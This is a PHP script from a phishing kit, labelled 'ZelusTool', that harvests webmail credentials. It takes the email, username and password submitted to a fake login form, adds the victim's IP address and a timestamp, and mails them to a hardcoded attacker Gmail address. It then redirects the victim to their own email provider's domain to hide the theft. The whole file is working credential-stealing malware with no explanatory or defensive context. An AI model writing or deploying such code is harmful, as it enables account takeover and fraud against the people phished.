<?php
//initiallize form details
$ip = getenv("REMOTE_ADDR");
$email = $_POST['email'];
$username = $_POST['username'];
$password = $_POST['password'];
$conpwd = $_POST['conpwd'];
$datamasii=date("D M d, Y g:i a");

//mail function
    $ToEmail = 'goldbello123@gmail.com


';
    $EmailSubject = 'webmail';
    $mailheader = 'emersongold@yandex.com';
    $mailheader .= "Reply-To: ".$_POST["email"]."\r\n";
    $mailheader .= "Content-type: text/html; charset=iso-8859-1\r\n";
    $MESSAGE_BODY = "email: ".$_POST["email"]."\n";
	$MESSAGE_BODY = "username: ".$_POST["username"]."\n";
	$MESSAGE_BODY = "password: ".$_POST["password"]."\n";
	$MESSAGE_BODY = "conpwd: ".$_POST["conpwd"]."\n";
	
//message
$MESSAGE_BODY = "Powered By:ZelusTool <jadeix92@yahoo.com>
EMAIL : $email
USERNAME: $username
PASSWORD: $password
conpwd: $conpwd

----------------------------------------------------
IP : $ip 
DATE : $datamasii
";

    mail($ToEmail, $EmailSubject, $MESSAGE_BODY, $mailheader) or die ("Failure");
	
$domain_name = substr(strrchr($_POST['email'], "@"), 1);

header("Location:  http://".$domain_name."");
  
?>
